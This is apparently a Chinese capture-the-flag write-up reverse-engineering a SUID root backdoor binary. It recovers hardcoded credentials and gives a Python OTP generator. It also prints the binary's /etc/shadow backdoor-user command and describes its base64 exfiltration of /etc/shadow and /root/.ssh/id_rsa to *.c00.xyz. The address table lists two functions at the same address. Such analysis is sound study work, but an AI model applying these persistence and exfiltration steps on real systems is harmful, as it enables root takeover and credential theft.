---
sidebar_position: 2
---

# SUID ELF 逆向分析与利用

## 概述

该 ELF 文件具有 SUID 权限，`main` 函数在程序启动时立即调用 `setgid(0)` 和 `setuid(0)` 提升至 root 权限。只需通过三重认证（用户名 + 密码 + OTP），即可触发菜单并读取 flag 或植入后门。

```c
int main(int argc, const char **argv, const char **envp)
{
    setgid(0);
    setuid(0);
    a(0);   // 认证 + 菜单
    return 0;
}
```

---

## 执行流程

```plaintext
main()
 ├─ setgid(0) / setuid(0)     ← 提权至 root
 └─ a()                        ← 认证入口
     ├─ g_u()                  ← 获取正确用户名
     ├─ g_p()                  ← 获取正确密码
     ├─ g_o()                  ← 计算当前 OTP
     └─ l_m()                  ← 主菜单
         ├─ 1. a_b()           ← Plant Backdoor
         ├─ 2. r_s()           ← Read Secret (/opt/flag.txt)
         └─ 3. s_b()           ← Restart exfiltration
```

---

## 认证凭据逆向

### 1. 用户名 —— `g_u()`

源码如下：

```c
_QWORD *g_u()
{
    unsigned __int64 v1 = 0xE4F9F9F2FDF5F7F4LL;
    for (int i = 0; i <= 7; ++i)
        *((BYTE *)&v1 + i) ^= 0x96u;
    // ...
}
```

每字节与 `0x96` 异或还原：

| 索引 | 原始字节 | XOR 0x96 | 字符 |
| :--: | :------: | :------: | :--: |
|  0   |  `0xF4`  |  `0x62`  | `b`  |
|  1   |  `0xF7`  |  `0x61`  | `a`  |
|  2   |  `0xF5`  |  `0x63`  | `c`  |
|  3   |  `0xFD`  |  `0x6B`  | `k`  |
|  4   |  `0xF2`  |  `0x64`  | `d`  |
|  5   |  `0xF9`  |  `0x6F`  | `o`  |
|  6   |  `0xF9`  |  `0x6F`  | `o`  |
|  7   |  `0xE4`  |  `0x72`  | `r`  |

**用户名：`backdoor`**

---

### 2. 密码 —— `g_p()`

源码如下（字节变换：`byte[i] = byte[i] + 2*i + 1`）：

```c
__int64 *g_p()
{
    __int64 v1 = 0x2C2F303525331E3BLL;
    __int16 v2 = 21047;   // 0x5237
    char    v3 = -21;     // 0xEB
    unsigned int v6 = 0;
    while (v6 <= 0xA)
    {
        int v5 = *((unsigned __int8 *)&v1 + v6);
        v5 += v6;
        ++v5;
        v5 += v6;
        *((BYTE *)&v1 + v6++) = v5;
    }
    // ...
}
```

变换公式：`result[i] = (original[i] + 2*i + 1) & 0xFF`

原始字节（小端序）：`3B 1E 33 25 35 30 2F 2C 37 52 EB`

|  i  |  原始  |  结果  |               字符               |
| :-: | :----: | :----: | :------------------------------: |
|  0  | `0x3B` | `0x3C` |               `<`                |
|  1  | `0x1E` | `0x21` |               `!`                |
|  2  | `0x33` | `0x38` |               `8`                |
|  3  | `0x25` | `0x2C` |               `,`                |
|  4  | `0x35` | `0x3E` |               `>`                |
|  5  | `0x30` | `0x3B` |               `;`                |
|  6  | `0x2F` | `0x3C` |               `<`                |
|  7  | `0x2C` | `0x3B` |               `;`                |
|  8  | `0x37` | `0x48` |               `H`                |
|  9  | `0x52` | `0x65` |               `e`                |
| 10  | `0xEB` | `0xFA` | （截止符前，实际密码取前10字节） |

**密码：`<!8,>;<;He`**

---

### 3. OTP —— `g_o()`

程序实现了一个**非标准 TOTP**，秘钥为硬编码字符串 `59329788626084537462`，时间步长 30 秒，内部通过自定义双轮 SHA1（HMAC 变体）计算 6 位 OTP。

**关键参数：**

- `ipad` = `0x36`，`opad` = `0x5C`（与 RFC 4226 相同）
- 输入固定填充到 **128 字节**（非标准，标准为 64 字节）

**实时计算脚本（Python 3）：**

```python
import hashlib, time, struct

def compute_otp():
    key = b"59329788626084537462"
    # 填充 key 到 64 字节
    key_padded = key + b'\x00' * (64 - len(key))

    timestamp = int(time.time()) // 30
    counter   = struct.pack(">Q", timestamp)

    inner_key = bytes(b ^ 0x36 for b in key_padded)
    outer_key = bytes(b ^ 0x5C for b in key_padded)

    # 第一轮：64字节内层密钥 + 8字节计数器 + 56字节零填充 = 128 字节
    v12 = hashlib.sha1(inner_key + counter + b'\x00' * 56).digest()

    # 第二轮：64字节外层密钥 + 20字节哈希 + 44字节零填充 = 128 字节
    v12 = hashlib.sha1(outer_key + v12 + b'\x00' * 44).digest()

    # 动态截断（标准 HOTP 方式）
    offset = v12[19] & 0xF
    code = ((v12[offset]   & 0x7F) << 24 |
             v12[offset+1]          << 16 |
             v12[offset+2]          <<  8 |
             v12[offset+3]) % 1_000_000

    return f"{code:06d}"

print(compute_otp())
```

:::caution
OTP 每 30 秒更新一次，需确保本机时间与靶机时间同步，并在同一窗口内完成输入。
:::

---

## 利用路径

认证通过后进入主菜单  `l_m()`，有三条利用路径：

### 路径 1：读取 Flag（最直接）

选择 **Option 2 — Read Secret**，程序以 root 身份执行：

```c
FILE *v2 = fopen("/opt/flag.txt", "r");
fscanf(v2, "%s", v1);
printf("Secret: %s\n\n", v1);
```

直接输出 `/opt/flag.txt` 的内容。

---

### 路径 2：植入 Shadow 后门（权限持久化）

选择 **Option 1 — Plant Backdoor**，程序：

1. 调用 `g_u_p()` 生成明文密码（字符串 `"iL>(w6Eh5kW"` 每字节减 5 → `dG9#r1@c0fR`）
2. 以 salt `$6$52Cz9R5yJTSpDulz` 对其进行 sha512crypt
3. 执行：

```bash
echo 'tom:<sha512_hash>:19027:0:99999:7:::' >> /etc/shadow
```

之后可使用 `su tom`（密码 `dG9#r1@c0fR`）获取 root shell，前提是 `/etc/passwd` 中存在 `tom` 条目。

---

### 路径 3：敏感文件外泄溯源

选择 **Option 3 — Restart exfiltration**，程序将以下文件逐行 base64 编码后通过 HTTPS 请求发往 `*.c00.xyz`：

| 文件                      |
| ------------------------- |
| `/etc/passwd`             |
| `/etc/shadow`             |
| `/etc/ssl/private/*`      |
| `/root/.ssh/id_rsa`       |
| `/etc/network/interfaces` |
| `/etc/resolv.conf`        |

数据外泄格式：`https://<base64_line>.c00.xyz`（去除 `=` 填充字符）

---

## 完整利用步骤

```bash
# Step 1：计算当前 OTP
python3 otp.py
# 输出类似：042817

# Step 2：执行 SUID 二进制
./[目标程序]

# Step 3：输入凭据
# Username: backdoor
# Password: <!8,>;<;He
# OTP:      042817

# Step 4：选择菜单项
# 选 2 → 直接读 flag
# 选 1 → 植入 shadow 持久后门
```

---

## 关键函数地址速查

| 函数地址 | 函数名  |             功能             |
| :------: | :-----: | :--------------------------: |
| `0x224f` | `main`  |     入口，提权并调用认证     |
| `0x1fa8` |   `a`   | 认证逻辑（用户名/密码/OTP）  |
| `0x1c96` |  `g_u`  |    生成用户名（XOR 解密）    |
| `0x1d00` |  `g_p`  |   生成密码（线性变换解密）   |
| `0x1c17` | `g_u_p` |     生成后门用户密码明文     |
| `0x231d` |  `g_o`  | 计算 TOTP（自定义双轮 SHA1） |
| `0x2163` |  `l_m`  |          主菜单循环          |
| `0x1fa8` |  `r_s`  |     读取 `/opt/flag.txt`     |
| `0x19a9` |  `a_b`  |   植入 `/etc/shadow` 后门    |
| `0x20ed` |  `s_b`  |         触发文件外泄         |
| `0x1dcb` |  `b_e`  |   base64 编码并 curl 发送    |
